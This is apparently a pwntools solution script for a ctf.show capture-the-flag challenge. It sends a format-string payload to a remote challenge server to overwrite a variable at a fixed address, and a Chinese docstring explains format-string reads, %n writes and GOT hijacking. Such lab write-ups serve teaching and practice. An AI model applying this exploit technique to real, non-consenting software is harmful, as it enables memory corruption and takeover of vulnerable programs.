from pwn import *
from LibcSearcher import *

#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386", os = 'linux', log_level = 'debug')

#io = process("./pwn")
io = remote('pwn.challenge.ctf.show', 28235)
elf = ELF("./pwn")
libc = ELF('./libc.so.6')

# daniu = 0x804B038：目标地址，可能是要覆盖的变量或函数地址
daniu = 0x804B038

# payload = fmtstr_payload(7, {daniu:6})：构造格式化字符串payload
# 7：格式化字符串的偏移量
# {daniu:6}：将地址daniu处的值修改为6
payload = fmtstr_payload(7, {daniu:6})

io.send(payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：fmtstr - 格式化字符串漏洞
2. 核心原理：
   - 利用格式化字符串漏洞可以读取和写入内存中的数据
   - fmtstr_payload函数是pwntools中用于生成格式化字符串payload的工具
3. 关键参数：
   - 第一个参数7：格式化字符串的偏移量，即第几个参数开始是我们可控的数据
   - 第二个参数{daniu:6}：字典形式，表示将地址daniu处的值修改为6
4. 执行流程：
   - 构造格式化字符串payload，包含写入操作
   - 发送payload触发漏洞
   - 通过格式化字符串漏洞修改目标地址的值
5. 格式化字符串漏洞常见利用方式：
   - 读取任意内存（%x, %s等）
   - 写入任意内存（%n, %hn, %hhn等）
   - 覆盖GOT表实现函数劫持
"""
